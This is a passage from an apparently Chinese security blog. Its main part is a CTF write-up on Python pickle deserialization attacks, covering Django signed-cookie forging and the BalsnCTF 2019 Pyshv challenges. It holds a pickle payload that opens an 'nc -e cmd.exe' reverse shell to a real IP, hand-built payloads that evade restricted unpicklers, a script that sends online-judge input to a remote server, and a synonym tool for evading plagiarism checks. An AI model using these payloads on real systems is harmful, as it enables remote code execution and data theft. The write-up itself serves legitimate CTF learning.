import datetime
import json
import re
import time
import zlib
import pickle
from django.utils import baseconv
from django.utils.crypto import constant_time_compare, salted_hmac
from django.utils.encoding import force_bytes
from django.utils.module_loading import import_string
from django import core
from django.core import signing


myexp=b&#39;&#39;&#39;cbuiltins
globals
(tRp100
cbuiltins
getattr
p101
(g100
S&#39;get&#39;
tR(S&#39;builtins&#39;
tRp103
g101
(g103
S&#39;eval&#39;
tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;
tR.&#39;&#39;&#39;
def pickle_exp(SECRET_KEY):
    data = myexp
    compress=True
    # Flag for if it&#39;s been compressed or not
    is_compressed = False
    salt=&#39;django.contrib.sessions.backends.signed_cookies&#39;
    if compress:
        # Avoid zlib dependency unless compress is being used
        compressed = zlib.compress(data)
        if len(compressed) &lt; (len(data) - 1):
            data = compressed
            is_compressed = True
    base64d = signing.b64_encode(data).decode()
    if is_compressed:
        base64d = &#39;.&#39; + base64d
    print(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))


pickle_exp(&quot;asdasdasdasdas&quot;)
</code></pre>
<p>接下来就是如何构造恶意的pickle代码的问题了</p>
<p>题目限制了只能加载builtins里的属性</p>
<p>且属性名不能为以下内容</p>
<pre><code>blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}</code></pre><p>利用<code>__reduce__</code>来生成pickle代码已经无法满足要求了,我们不得不手写pickle代码,怎么手写就不详细讲了</p>
<p>我们现在把目光聚焦在如何构造利用链上</p>
<p>builtins的属性(删除部分)</p>
<pre><code class="python">[&#39;_&#39;, &#39;__build_class__&#39;, &#39;__debug__&#39;, &#39;__doc__&#39;, &#39;__import__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;abs&#39;, &#39;all&#39;, &#39;any&#39;, &#39;ascii&#39;, &#39;bin&#39;, &#39;bool&#39;, &#39;breakpoint&#39;, &#39;bytearray&#39;, &#39;bytes&#39;, &#39;callable&#39;, &#39;chr&#39;, &#39;classmethod&#39;, &#39;compile&#39;, &#39;complex&#39;, &#39;copyright&#39;, &#39;credits&#39;, &#39;delattr&#39;, &#39;dict&#39;, &#39;dir&#39;, &#39;divmod&#39;, &#39;enumerate&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;exit&#39;, &#39;filter&#39;, &#39;float&#39;, &#39;format&#39;, &#39;frozenset&#39;, &#39;getattr&#39;, &#39;globals&#39;, &#39;hasattr&#39;, &#39;hash&#39;, &#39;help&#39;, &#39;hex&#39;, &#39;id&#39;, &#39;input&#39;, &#39;int&#39;, &#39;isinstance&#39;, &#39;issubclass&#39;, &#39;iter&#39;, &#39;len&#39;, &#39;license&#39;, &#39;list&#39;, &#39;locals&#39;, &#39;map&#39;, &#39;max&#39;, &#39;memoryview&#39;, &#39;min&#39;, &#39;next&#39;, &#39;object&#39;, &#39;oct&#39;, &#39;open&#39;, &#39;ord&#39;, &#39;pow&#39;, &#39;print&#39;, &#39;property&#39;, &#39;quit&#39;, &#39;range&#39;, &#39;repr&#39;, &#39;reversed&#39;, &#39;round&#39;, &#39;set&#39;, &#39;setattr&#39;, &#39;slice&#39;, &#39;sorted&#39;, &#39;staticmethod&#39;, &#39;str&#39;, &#39;sum&#39;, &#39;super&#39;, &#39;tuple&#39;, &#39;type&#39;, &#39;vars&#39;, &#39;zip&#39;]</code></pre>
<p>我们查看builtins的属性我们发现两个有意思的东西,一个是getattr,另一个是globals</p>
<p>虽然限制我们属性名不能为eval啥的,但是并没有限制不能出现在参数处</p>
<p>所以<code>getattr(builtins,&quot;eval&quot;)</code>便能得到eval方法了</p>
<p>但是看pickle的操作码并没有发现能直接导入一个模块的操作,在结合globals我们很容易想到<code>getattr(getattr(globals(),&quot;builtins&quot;),&quot;eval&quot;)</code></p>
<p>最后的payload:<code>builtins.getattr(builtins.getattr(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)(&quot;evil code&quot;)</code></p>
<p>其对应的pickle代码是</p>
<pre><code class="python">b&#39;&#39;&#39;cbuiltins
globals
(tRp100
cbuiltins
getattr
p101
(g100
S&#39;get&#39;
tR(S&#39;builtins&#39;
tRp103
g101
(g103
S&#39;eval&#39;
tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;
tR.&#39;&#39;&#39;</code></pre>
<p>最后就差secret_key了,看别人的wp都是调试易得易得secret_key//</p>
<p>但是我是没找到,于是自己写了个过滤器</p>
<p>递归查找settings</p>
<pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirect
from django.template import engines
from django.contrib.auth import login as auth_login, get_user_model, authenticate
from django.contrib.auth.views import LoginView, logout_then_login
from django.contrib.auth.decorators import login_required
from django.views import generic
from django import template

import django
from django import template
register = template.Library()

@register.filter
def get_dict(obj,way=&quot;&quot;,depth=0):
    if depth&gt;11:
        return 
    objdir=dir(obj)
    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}
    result=&quot;&quot;

    for i in objdir:            
        try :
            if &#39;_&#39; == i[0]:
                continue
            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:
                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1) 
        except TypeError:
            pass

    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:
        print(way)
        return result+way+&quot;\n&quot;
    return result</code></pre>
<p>这次是真的易得了:),至此结束</p>
<h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><pre><code class="python">#!/usr/bin/python3 -u

import securePickle as pickle
import codecs


pickle.whitelist.append(&#39;sys&#39;)


class Pysh(object):
    def __init__(self):
        self.login()
        self.cmds = {}

    def login(self):
        user = input().encode(&#39;ascii&#39;)
        user = codecs.decode(user, &#39;base64&#39;)
        user = pickle.loads(user)
        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)

    def run(self):
        while True:
            req = input(&#39;$ &#39;)
            func = self.cmds.get(req, None)
            if func is None:
                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)
            else:
                func()


if __name__ == &#39;__main__&#39;:
    pysh = Pysh()
    pysh.run()</code></pre>
<pre><code class="python">import pickle
import io


whitelist = []


# See https://docs.python.org/3.7/library/pickle.html#restricting-globals
class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or &#39;.&#39; in name:
            raise KeyError(&#39;The pickle is spoilt :(&#39;)
        return pickle.Unpickler.find_class(self, module, name)


def loads(s):
    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
    return RestrictedUnpickler(io.BytesIO(s)).load()


dumps = pickle.dumps</code></pre>
<p>只允许sys里的属性,而且属性里不能有.</p>
<pre><code>[&#39;__displayhook__&#39;, &#39;__doc__&#39;, &#39;__excepthook__&#39;, &#39;__interactivehook__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;__stderr__&#39;, &#39;__stdin__&#39;, &#39;__stdout__&#39;, &#39;_clear_type_cache&#39;, &#39;_current_frames&#39;, &#39;_debugmallocstats&#39;, &#39;_getframe&#39;, &#39;_git&#39;, &#39;_home&#39;, &#39;_xoptions&#39;, &#39;abiflags&#39;, &#39;api_version&#39;, &#39;argv&#39;, &#39;base_exec_prefix&#39;, &#39;base_prefix&#39;, &#39;builtin_module_names&#39;, &#39;byteorder&#39;, &#39;call_tracing&#39;, &#39;callstats&#39;, &#39;copyright&#39;, &#39;displayhook&#39;, &#39;dont_write_bytecode&#39;, &#39;exc_info&#39;, &#39;excepthook&#39;, &#39;exec_prefix&#39;, &#39;executable&#39;, &#39;exit&#39;, &#39;flags&#39;, &#39;float_info&#39;, &#39;float_repr_style&#39;, &#39;get_asyncgen_hooks&#39;, &#39;get_coroutine_wrapper&#39;, &#39;getallocatedblocks&#39;, &#39;getcheckinterval&#39;, &#39;getdefaultencoding&#39;, &#39;getdlopenflags&#39;, &#39;getfilesystemencodeerrors&#39;, &#39;getfilesystemencoding&#39;, &#39;getprofile&#39;, &#39;getrecursionlimit&#39;, &#39;getrefcount&#39;, &#39;getsizeof&#39;, &#39;getswitchinterval&#39;, &#39;gettrace&#39;, &#39;hash_info&#39;, &#39;hexversion&#39;, &#39;implementation&#39;, &#39;int_info&#39;, &#39;intern&#39;, &#39;is_finalizing&#39;, &#39;last_traceback&#39;, &#39;last_type&#39;, &#39;last_value&#39;, &#39;maxsize&#39;, &#39;maxunicode&#39;, &#39;meta_path&#39;, &#39;modules&#39;, &#39;path&#39;, &#39;path_hooks&#39;, &#39;path_importer_cache&#39;, &#39;platform&#39;, &#39;prefix&#39;, &#39;ps1&#39;, &#39;ps2&#39;, &#39;set_asyncgen_hooks&#39;, &#39;set_coroutine_wrapper&#39;, &#39;setcheckinterval&#39;, &#39;setdlopenflags&#39;, &#39;setprofile&#39;, &#39;setrecursionlimit&#39;, &#39;setswitchinterval&#39;, &#39;settrace&#39;, &#39;stderr&#39;, &#39;stdin&#39;, &#39;stdout&#39;, &#39;thread_info&#39;, &#39;version&#39;, &#39;version_info&#39;, &#39;warnoptions&#39;]
</code></pre><p>发现有个modules,但是loads那里有一个死亡raise</p>
<p><code>sys._getframe</code> 可以返回带有exec的字典,但是好像没啥用</p>
<p>现在问题是不知道如何取出modules里的值</p>
<p>阅读文档发现</p>
<blockquote>
<p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. </p>
</blockquote>
<p>可以修改modules来修改模块内容</p>
<pre><code class="shell">&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules[&#39;sys&#39;]=sys.modules
&gt;&gt;&gt; import sys
&gt;&gt;&gt; dir(sys)
[&#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__delitem__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setitem__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;fromkeys&#39;, &#39;get&#39;, &#39;items&#39;, &#39;keys&#39;, &#39;pop&#39;, &#39;popitem&#39;, &#39;setdefault&#39;, &#39;update&#39;, &#39;values&#39;]</code></pre>
<p>然后sys就被替换成sys.modules了,就可以拿到os了</p>
<p>然后再对sys.modules[‘sys’]再赋值为os</p>
<p>就可以import os了</p>
<p>(师傅们tql)</p>
<p>构造payload</p>
<pre><code>csys
modules
S&#39;sys&#39;
csys
modules
p100
scsys
get
(S&#39;os&#39;
tRp101
g100
S&#39;sys&#39;
g101
scsys
system
(S&#39;dir&#39;
tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><pre><code class="python">#!/usr/bin/python3 -u

import securePickle as pickle
import codecs


pickle.whitelist.append(&#39;structs&#39;)


class Pysh(object):
    def __init__(self):
        self.login()
        self.cmds = {
            &#39;help&#39;: self.cmd_help,
            &#39;flag&#39;: self.cmd_flag,
        }

    def login(self):
        user = input().encode(&#39;ascii&#39;)
        user = codecs.decode(user, &#39;base64&#39;)
        user = pickle.loads(user)
        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)

    def run(self):
        while True:
            req = input(&#39;$ &#39;)
            func = self.cmds.get(req, None)
            if func is None:
                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)
            else:
                func()

    def cmd_help(self):
        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))

    def cmd_su(self):
        print(&quot;Not Implemented QAQ&quot;)
        # self.user.privileged = 1

    def cmd_flag(self):
        print(&quot;Not Implemented QAQ&quot;)


if __name__ == &#39;__main__&#39;:
    pysh = Pysh()
    pysh.run()</code></pre>
<p>这次更骚了直接给了个空模块</p>
<pre><code class="shell">&gt;&gt;&gt; dir(structs)
[&#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre>
<p><code>__spec__,__loader__,__builtins__</code>是我们需要注意的</p>
<p>我们看一下操作码c(看重载后的find_class代码,看别人wp的时候没看重载后的find_class,然后连wp都看不懂了)的实现,发现调用了<code>__import__</code></p>
<p>在文档中发现</p>
<blockquote>
<p>此函数(<code>__import__</code>)会由 <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义 </p>
</blockquote>
<p>而<code>__buiutins__</code>里面也有<code>__import__</code></p>
<pre><code>&gt;&gt;&gt; structs.__builtins__[&#39;__import__&#39;]=eval
&gt;&gt;&gt; import os
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
TypeError: eval expected at most 3 arguments, got 5
&gt;&gt;&gt; __import__(&#39;print(123)&#39;)
123</code></pre><p>成功修改了<code>__import__</code></p>
<p>我们再看重载的find_class</p>
<p>securePickle.py</p>
<pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or &#39;.&#39; in name:
            raise KeyError(&#39;The pickle is spoilt :(&#39;)
        module = __import__(module)
        return getattr(module, name)
#一般重载都会改成if xxxx : raise xxxx else:  return pickle.Unpickler.find_class(self, module, name)
</code></pre>
<p>而原来的find_class是这样的</p>
<pre><code class="python">def find_class:
    __import__(module, level=0)
    return getattr(sys.modules[module], name)</code></pre>
<p>接着我们可以通过操作码c来实现一下操作</p>
<pre><code class="python">return getattr(__import__(module), name)</code></pre>
<p>如果能令<code>__import__(module)</code>的返回值为<code>__builtins__</code>时,就可以取出<code>__builtins__</code>里的值</p>
<p>结合<a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id1" target="_blank" rel="noopener">魔术方法</a><code>__getattribute__</code>便可以实现</p>
<p>于是构造</p>
<pre><code class="python">bis=structs.__builtins__
structs.__setattr__(&#39;structs&#39;,bis)#name只能为structs
bis[&#39;__import__&#39;]=structs.__getattribute__
getattr(__import__(&quot;structs&quot;),&quot;get&quot;)(&quot;eval&quot;)(&quot;print(123)&quot;)</code></pre>
<p>对应的pickle代码</p>
<pre><code>cstructs
__builtins__
p100
0cstructs
__setattr__
(S&#39;structs&#39;
g100
tRg100
S&#39;__import__&#39;
cstructs
__getattribute__
scstructs
get
(S&quot;eval&quot;
tR(S&#39;print(123)&#39;
tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><p>structs.py</p>
<pre><code class="python">class User(object):
    def __init__(self, name, group):
        self.name = name
        self.group = group
        self.isadmin = 0
        self.prompt = &#39;&#39;</code></pre>
<pre><code class="python">import pickle
import io


whitelist = []


# See https://docs.python.org/3.7/library/pickle.html#restricting-globals
class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or &#39;.&#39; in name:
            raise KeyError(&#39;The pickle is spoilt :(&#39;)
        return pickle.Unpickler.find_class(self, module, name)


def loads(s):
    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
    return RestrictedUnpickler(io.BytesIO(s)).load()


dumps = pickle.dumps</code></pre>
<p>server.py</p>
<pre><code class="python">import securePickle as pickle
import codecs
import os


pickle.whitelist.append(&#39;structs&#39;)


class Pysh(object):
    def __init__(self):
        self.key = os.urandom(100)
        self.login()
        self.cmds = {
            &#39;help&#39;: self.cmd_help,
            &#39;whoami&#39;: self.cmd_whoami,
            &#39;su&#39;: self.cmd_su,
            &#39;flag&#39;: self.cmd_flag,
        }

    def login(self):
        with open(&#39;../flag.txt&#39;, &#39;rb&#39;) as f:
            flag = f.read()
        flag = bytes(a ^ b for a, b in zip(self.key, flag))
        user = input().encode(&#39;ascii&#39;)
        user = codecs.decode(user, &#39;base64&#39;)
        user = pickle.loads(user)
        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)
        user.privileged = False
        user.flag = flag
        self.user = user

    def run(self):
        while True:
            req = input(&#39;$ &#39;)
            func = self.cmds.get(req, None)
            if func is None:
                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)
            else:
                func()

    def cmd_help(self):
        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))

    def cmd_whoami(self):
        print(self.user.name, self.user.group)

    def cmd_su(self):
        print(&quot;Not Implemented QAQ&quot;)
        # self.user.privileged = 1

    def cmd_flag(self):
        if not self.user.privileged:
            print(&#39;flag: Permission denied&#39;)
        else:
            print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))


if __name__ == &#39;__main__&#39;:
    pysh = Pysh()
    pysh.run()</code></pre>
<p>如果我们想拿到flag,要么命令执行直接拿flag要么就令<code>user.privileged=True</code> 调用cmd_flag来拿flag</p>
<p>但是再反序列化处</p>
<pre><code class="python">        user = pickle.loads(user)
        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)
        user.privileged = False</code></pre>
<p><code>user.privileged</code>会被覆盖为False,再康康其他的信息把</p>
<p><code>dir(structs)</code>:</p>
<pre><code class="python">[&#39;User&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre>
<hr>
<p>几个小时后,看wp学成归来.</p>
<p>我:艹,太骚了,师傅们牛逼死了</p>
<hr>
<p>之前说有两个解题思路,命令执行这一个思路在看了一会之后就觉得不太行,毫无头绪</p>
<p>再康康让<code>user.privileged=False</code>失效这一思路,emmmm感觉也不太行.</p>
<p>但是,类的赋值肯定会受到一些特殊函数的影响</p>
<p>在研究类的赋值的时候可以找到<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">描述符</a>可以自定义赋值函数</p>
<p>那么如果我们能让User的<code>__set__</code>变成一个接受3个参数的函数,就可以令<code>user.privileged=False</code>无效</p>
<p>但是很显然pickle里是无法直接编写代码的,令<code>__set__=&quot;&quot;</code>?更不行,会直接报错</p>
<p>继续阅读代码我们会发现一个神奇的东西</p>
<pre><code class="python">class User(object):
    def __init__(self, name, group):
        self.name = name
        self.group = group
        self.isadmin = 0
        self.prompt = &#39;&#39;
        print(&quot;name:%s ,group:%s&quot;%(name,group))</code></pre>
<p><code>User.__init__</code>刚好接受三个参数</p>
<p>我们能不能让<code>__set__=User</code>?,然后调用<code>__set__</code>的时候调用<code>User.__init__</code></p>
<pre><code class="python">&gt;&gt;&gt; setattr(User,&#39;test&#39;,User(123,123))
name:123 ,group:123
&gt;&gt;&gt; setattr(User,&quot;__set__&quot;,User)
&gt;&gt;&gt; b=User(123,123)
name:123 ,group:123
&gt;&gt;&gt; b.test=123123
name:&lt;structs.User object at 0x0000017BA1538748&gt; ,group:123123</code></pre>
<p>于是构造:</p>
<pre><code class="python">a=__import__(&quot;structs&quot;).User
b=User(&quot;123&quot;,&quot;456&quot;)
setattr(a,&quot;privileged&quot;,b)
setattr(a,&quot;__set__&quot;,a)
return b</code></pre>
<p>对应的pickle代码为</p>
<pre><code>cstructs
User
p100
(S&quot;123&quot;
S&quot;456&quot;
tRp101
g100
(N}S&#39;privileged&#39;
g101
sS&#39;__set__&#39;
g100
stbg101
.</code></pre><pre><code>$ help
Available commands: help whoami su flag
$ whoami
123 456
$ flag
b&#39;Balsn{pY7h0n1dae_ObJ3c7}\n&#39;</code></pre><p>hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
<p><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p>
<p> <a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a> </p>
<p> <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a> </p>
<p> <a href="https://xz.aliyun.com/t/5306" target="_blank" rel="noopener">https://xz.aliyun.com/t/5306</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/16/pickle/">http://blog.ccreater.top/2019/12/16/pickle/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/12/16/pickle/" data-id="cka3ckr360038v4v0cur4gmp5" data-title="python  pickle 入门" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-勉强能用的论文降重" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/" class="article-date">
  <time class="dt-published" datetime="2019-12-15T10:38:45.000Z" itemprop="datePublished">2019-12-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">勉强能用的论文降重</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="勉强能用的论文降重"><a href="#勉强能用的论文降重" class="headerlink" title="勉强能用的论文降重"></a>勉强能用的论文降重</h1><pre><code class="python">import sys

if len(sys.argv) !=2:
    print(&quot;Usage: %s inputfile outputfile&quot; % sys.argv[0])
    exit()

import synonyms


f=sys.argv[1]
s=&quot;&quot;
with open(f,&quot;r&quot;) as fl:
    s=fl.read()
resstr,stype=synonyms.seg(s)

with open(sys.argv[2],&quot;w&quot;) as fw:
    for i in resstr:
        if len(i)==1:
            fw.write(i)
        else :
            nearbystr,num=synonyms.nearby(i)

            if len(nearbystr)&gt;1 and num[1]&gt; 0.75:
                print(nearbystr[1],num[1])
                fw.write(nearbystr[1])
            else :
                fw.write(i)

</code></pre>
<p>可以调整<code>if len(nearbystr)&gt;1 and num[1]&gt; 0.75:</code>来修改近义词的准确率.</p>
<p>用完之后一定要自己校对一遍!!!不然…..</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/15/勉强能用的论文降重/">http://blog.ccreater.top/2019/12/15/勉强能用的论文降重/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/" data-id="cka3ckr3j0047v4v06u43b0ku" data-title="勉强能用的论文降重" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-在线oj获取数据" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" class="article-date">
  <time class="dt-published" datetime="2019-12-15T09:17:13.844Z" itemprop="datePublished">2019-12-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/">在线oj获取数据</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="在线oj获取数据"><a href="#在线oj获取数据" class="headerlink" title="在线oj获取数据"></a>在线oj获取数据</h1><p>python3:</p>
<pre><code class="python">import socket
import sys    

ip = &#39;39.108.164.219&#39;
port = 60000

def send_raw(raw):

    try:
        with socket.create_connection((ip, port), timeout=10) as conn:
            conn.send(bytes(raw,encoding=&quot;ascii&quot;))
            conn.close()
    except:
        return False  
    return True

data=&quot;&quot;
for line in sys.stdin:
    data+=line
send_raw(data)
</code></pre>
<p>vps上运行</p>
<pre><code class="shell">#!/bin/bash
i=1
while [ $i -eq 1 ]
do 
     nc -FNlp 60000  &gt;&gt; /tmp/data
    echo -e  &quot;\n---------------------------------\n&quot; &gt;&gt; /tmp/data
done
</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/15/在线oj获取数据/">http://blog.ccreater.top/2019/12/15/在线oj获取数据/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" data-id="cka3ckr3m004fv4v03xk5bi3q" data-title="在线oj获取数据" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-由cout和printf来对函数传参过程的探讨" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" class="article-date">
  <time class="dt-published" datetime="2019-12-14T08:37:53.214Z" itemprop="datePublished">2019-12-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/">由cout和printf来对函数传参过程的探讨</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="由cout和printf来对函数传参过程的探讨"><a href="#由cout和printf来对函数传参过程的探讨" class="headerlink" title="由cout和printf来对函数传参过程的探讨"></a>由cout和printf来对函数传参过程的探讨</h1><h2 id="令人疑惑的结果"><a href="#令人疑惑的结果" class="headerlink" title="令人疑惑的结果"></a>令人疑惑的结果</h2><p>来看一个代码吧</p>
